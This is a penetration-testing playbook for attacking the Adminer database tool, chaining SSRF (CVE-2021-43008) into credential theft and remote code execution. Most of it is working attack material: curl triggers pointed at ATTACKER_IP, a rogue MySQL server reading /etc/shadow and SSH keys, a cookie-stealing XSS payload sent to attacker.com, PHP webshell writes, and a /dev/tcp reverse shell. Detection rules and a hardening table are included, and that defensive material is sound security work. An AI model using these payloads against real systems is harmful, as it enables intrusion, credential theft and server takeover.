# Adminer Attack — SSRF → Credential Theft → RCE

**Scope:** authorized penetration testing, bug bounty, red team engagements only.
Every technique is paired with its detection signal and hardening fix.

---

## 1. What Is Adminer and Why It Is Dangerous

Adminer (formerly phpMinAdmin) is a single-file PHP database management tool.
It ships at `adminer.php`, `adminer-4.x.x.php`, `admin.php`, `db.php`, or inside
CMS admin panels. Because it accepts a `server` parameter that proxies database
connections, an unauthenticated attacker can weaponize it as a full SSRF relay
against any service reachable from the server — including internal RDS instances,
Redis, Memcached, or an attacker-controlled MySQL listener that dumps credentials.

---

## 2. Reconnaissance — Finding Adminer

### 2a. Google / Shodan dorks
```
# Google
inurl:"adminer.php" intext:"Login"
inurl:"adminer-4" filetype:php
site:target.com filetype:php inurl:adminer

# Shodan
http.title:"Adminer" port:80
http.html:"adminer" port:443

# Nuclei (built-in template)
nuclei -t exposures/panels/adminer-panel.yaml -u https://target.com
```

### 2b. ffuf / gobuster content discovery
```bash
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -fc 404 -mc 200,301,302 -t 50 | grep -i "adminer"

# common filenames
for f in adminer.php adminer-4.8.1.php db.php phpmyadmin/index.php admin/adminer.php; do
  curl -sk -o /dev/null -w "%{http_code} $f\n" "https://target.com/$f"
done
```

### 2c. JS / source-map leaks
```bash
# Check page source for Adminer links
curl -s https://target.com | grep -iE "(adminer|phpmyadmin|db\.php)"
```

---

## 3. CVE-2021-43008 — SSRF via `server` Parameter

**Affected:** Adminer 1.12.0 – 4.7.9 (all versions before 4.8.0)
**CVSS:** 7.5 HIGH
**NVD:** https://nvd.nist.gov/vuln/detail/CVE-2021-43008
**Auth required:** None

### Mechanism
Adminer passes the `server` POST/GET parameter directly to `mysqli_connect()` (or
the PDO equivalent for other drivers) without restricting which hosts are allowed.
An attacker points the server parameter at an attacker-controlled MySQL listener.
When Adminer initiates the connection, MySQL's handshake protocol exchanges the
plaintext password hash (or in older auth modes, the plaintext password) — which the
attacker's malicious MySQL captures.

### 3a. Set up a Rogue MySQL Listener (Responder / fake-mysql)

```bash
# Option 1 — responder (auto-captures MySQL creds)
sudo responder -I eth0 --mysql

# Option 2 — fake-mysql-cred-capture (purpose-built)
git clone https://github.com/allyshka/Rogue-MySql-Server
cd Rogue-MySql-Server
# Edit rogue_mysql_server.py → set FILE_TO_READ = '/etc/passwd'
python rogue_mysql_server.py
# Listens on 0.0.0.0:3306 by default
```

### 3b. Trigger the SSRF
```bash
# GET request — browser or curl
curl -sk "https://target.com/adminer.php?server=ATTACKER_IP&username=any&db=test"

# POST request (newer Adminer versions)
curl -sk -X POST "https://target.com/adminer.php" \
  -d "auth[driver]=server&auth[server]=ATTACKER_IP&auth[username]=root&auth[password]=&auth[db]=test"
```

### 3c. File Read via Rogue MySQL (LOAD DATA LOCAL INFILE)
The Rogue MySQL server can force `LOAD DATA LOCAL INFILE` during the handshake,
reading arbitrary files from the web server before the user even authenticates:

```python
# rogue_mysql_server.py — set this in the config section:
# filelist = ['/etc/passwd', '/etc/shadow', '/var/www/html/.env', '/root/.ssh/id_rsa']

# After triggering the SSRF, check the rogue server output:
# [*] Captured file: /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# ...
```

**Detection:** Web server logs show `POST /adminer.php` with `server=<external-IP>`.
Outbound MySQL (3306) to an unexpected destination in network flow logs.
**Hardening:** Block outbound 3306 at the firewall; upgrade to Adminer 4.8.0+.

---

## 4. Adminer 4.8.x and Later — Residual Attack Surface

Adminer 4.8.0 introduced a server allowlist concept, but misconfigurations remain:

### CVE-2023-45195 (verify on NVD — affects Adminer < 4.8.1)
- Reflected XSS in the `username` parameter displayed in the login error message.
- Exploitation: phish an authenticated admin into visiting a crafted Adminer URL;
  steal session cookies or trigger CSRF actions.
```
https://target.com/adminer.php?server=localhost&username=<script>fetch('https://attacker.com/?c='+document.cookie)</script>
```

### Insecure Default: No Authentication Lock
Adminer ships with zero access controls — anyone who can reach the URL can attempt
to connect to any database the PHP process can reach (localhost MySQL, PostgreSQL,
internal services). On shared hosting this often means a world-accessible root login.

```bash
# Detect open Adminer with MySQL root no-password
curl -sk -X POST "https://target.com/adminer.php" \
  -d "auth[driver]=server&auth[server]=localhost&auth[username]=root&auth[password]=&auth[db]=" \
  | grep -i "logout\|table\|database"
```

---

## 5. Forced Connection Attack — Credential Capture in Detail

### 5a. Full step-by-step with Responder
```bash
# Terminal 1 — start Responder on attacker box (public IP or VPS)
sudo responder -I eth0 -wP --mysql
# Wait for the connection…

# Terminal 2 — trigger via Adminer
curl -sk "https://target.com/adminer.php?server=<ATTACKER_VPS_IP>&username=root"
# Responder output:
# [MySQL] NTLMv2 Client   : <web-server-IP>
# [MySQL] Username         : root
# [MySQL] Hash             : root:::<hash>
```

### 5b. Crack the captured hash
```bash
# MySQL pre-4.1 hash (old_password) — direct cracking
hashcat -m 200 captured_hash.txt /usr/share/wordlists/rockyou.txt

# MySQL 4.1+ SHA1 double hash
hashcat -m 300 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

### 5c. Replay credentials
Once cracked, log into Adminer with the recovered credentials:
```bash
curl -sk -X POST "https://target.com/adminer.php" \
  -c cookies.txt \
  -d "auth[driver]=server&auth[server]=localhost&auth[username]=root&auth[password]=CRACKED&auth[db]="
```

---

## 6. Disk Enumeration via Adminer File Import

Adminer's "Execute SQL" and "Import" panels pass user-controlled SQL to the database.
With a privileged connection you can read OS files via MySQL's `LOAD DATA INFILE`:

### 6a. Read /etc/passwd
```sql
-- In Adminer's SQL console (requires FILE privilege)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');
SELECT LOAD_FILE('/root/.ssh/id_rsa');
SELECT LOAD_FILE('/var/www/html/.env');
SELECT LOAD_FILE('/var/www/html/wp-config.php');
SELECT LOAD_FILE('/etc/mysql/my.cnf');
```

### 6b. Read via LOAD DATA LOCAL INFILE (bypasses some restrictions)
```sql
-- Requires secure_file_priv = '' or the target path to be in allowed dir
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE tmp_exfil FIELDS TERMINATED BY '\n';
SELECT * FROM tmp_exfil;
```

**Detection:** MySQL general_log shows `LOAD_FILE` calls; audit log entries for FILE
privilege usage. Web logs show large SQL POST bodies to Adminer.
**Hardening:** Revoke FILE privilege from all users; set `secure_file_priv=/nonexistent`.

---

## 7. RCE Chain: Credentials → INTO OUTFILE → Webshell

### 7a. Classic MySQL webshell write
```sql
-- Requires FILE privilege + knowledge of web root + no secure_file_priv restriction
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Verify
-- curl "https://target.com/shell.php?cmd=id"
-- uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 7b. Bypass secure_file_priv via MySQL plugin directory
```sql
-- Check plugin dir (often writable)
SHOW VARIABLES LIKE 'plugin_dir';
-- /usr/lib/mysql/plugin/

SELECT 0x7f454c460201... INTO DUMPFILE '/usr/lib/mysql/plugin/udf_shell.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf_shell.so';
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"');
```

### 7c. MSSQL RCE via Adminer (xp_cmdshell)
```sql
-- When Adminer is connected to MSSQL
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -enc <base64_reverse_shell>';
```

### 7d. PostgreSQL COPY TO/FROM PROGRAM
```sql
-- When Adminer connected to PostgreSQL as superuser
COPY cmd_out FROM PROGRAM 'id';
-- or write a webshell:
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php';
```

---

## 8. Adminer as Internal Network Pivot (SSRF Escalation)

Because Adminer can connect to any host, it serves as a full SSRF relay for non-HTTP
protocols — Redis, Memcached, MongoDB, internal MySQL instances.

```bash
# Map internal services using Adminer as a probe
for ip in 10.0.0.{1..254}; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://target.com/adminer.php?server=$ip&username=root" --max-time 2)
  [ "$status" != "000" ] && echo "OPEN: $ip"
done

# Target internal Redis (Gopher or via Adminer's Redis driver if installed)
curl -sk "https://target.com/adminer.php?server=10.0.0.5&username=&db=0" \
  -d "auth[driver]=redis&auth[server]=10.0.0.5:6379"
```

---

## 9. Detection Signatures

### Apache / Nginx access log patterns
```regex
# Suspicious Adminer usage
POST /adminer\.php\?.*server=(?!localhost|127\.0\.0\.1)
GET /adminer\.php\?.*file=
POST .*adminer.*auth\[server\]=[^l]  # server != localhost

# Nuclei template for automated detection
id: adminer-ssrf-server-param
```

### SIEM / Wazuh rules
```xml
<!-- Alert on outbound MySQL from web servers -->
<rule id="100200" level="12">
  <if_group>firewall</if_group>
  <match>dpt=3306</match>
  <srcport>80,443</srcport>
  <description>Web server initiating outbound MySQL — possible Adminer SSRF</description>
</rule>
```

### MySQL audit log
```sql
-- Enable general log to catch LOAD_FILE and INTO OUTFILE
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/general.log';
-- Alert on: LOAD_FILE, INTO OUTFILE, INTO DUMPFILE, LOAD DATA
```

---

## 10. Hardening

| Control | Implementation |
|---------|---------------|
| Remove from production | `rm /var/www/html/adminer.php` — never deploy to prod |
| IP allowlist (nginx) | `allow 10.0.0.0/8; deny all;` in location block |
| HTTP basic auth layer | `auth_basic "Restricted"; auth_basic_user_file /etc/nginx/.htpasswd;` |
| Rename the file | Rename to a random UUID; security through obscurity as a last resort |
| Disable FILE privilege | `REVOKE FILE ON *.* FROM 'app_user'@'%';` |
| secure_file_priv | `secure_file_priv=/nonexistent` in my.cnf |
| Firewall outbound 3306 | Block web server from initiating outbound DB connections |
| Upgrade to 4.8.1+ | Server allowlist reduces SSRF to configured hosts only |
| Monitor for exposure | Weekly `nuclei -t exposures/panels/adminer-panel.yaml` scan |

---

## 11. Chained Attack Summary (TTP Flow)

```
RECON         →  nuclei/ffuf finds /adminer.php (unauthenticated)
SSRF SETUP    →  Start rogue MySQL on attacker VPS (Responder / rogue_mysql_server.py)
TRIGGER SSRF  →  POST server=<ATTACKER_VPS> to Adminer (CVE-2021-43008)
CRED CAPTURE  →  Rogue MySQL captures MySQL password hash
CRACK         →  hashcat -m 300 hash.txt rockyou.txt
LOGIN         →  Authenticate to Adminer with cracked creds
FILE READ     →  LOAD_FILE('/var/www/html/.env') → API keys, DB passwords
FILE WRITE    →  SELECT webshell INTO OUTFILE → RCE
PIVOT         →  Use Adminer to probe internal DB services via server param
```

---

## References

- NVD CVE-2021-43008: https://nvd.nist.gov/vuln/detail/CVE-2021-43008
- Adminer changelog / security patches: https://www.adminer.org/en/history/
- Hacktricks Adminer: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/adminer
- rogue_mysql_server: https://github.com/allyshka/Rogue-MySql-Server
- Nuclei templates: https://github.com/projectdiscovery/nuclei-templates/tree/main/exposures/panels